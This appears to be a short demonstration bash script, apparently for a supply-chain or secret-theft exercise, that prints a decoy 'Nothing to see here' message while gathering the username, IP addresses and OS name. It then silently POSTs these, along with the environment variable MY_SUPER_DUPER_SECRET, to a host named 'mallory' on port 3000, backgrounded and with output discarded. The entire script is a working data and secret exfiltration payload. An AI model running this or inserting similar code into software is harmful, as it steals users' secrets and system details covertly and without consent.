#!/bin/bash
echo "Nothing to see here ;)"
# get details about the system
user=$(whoami)
ip_address=$(ip addr show | grep inet | grep -v '127.0.0.1' | grep -v '::1' | awk '{print $2}' | cut -d/ -f1)
distro_details=$(cat /etc/os-release | grep NAME | head -n 1 | sed 's/"//g')

# report back to mallory
curl -s -X POST http://mallory:3000 \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -d "{\"user\": \"$user\", \"ip_address\": \"$ip_address\", \"distro_details\": \"$distro_details\", \"my_super_duper_secret\": \"$MY_SUPER_DUPER_SECRET\"}" -o /dev/null &
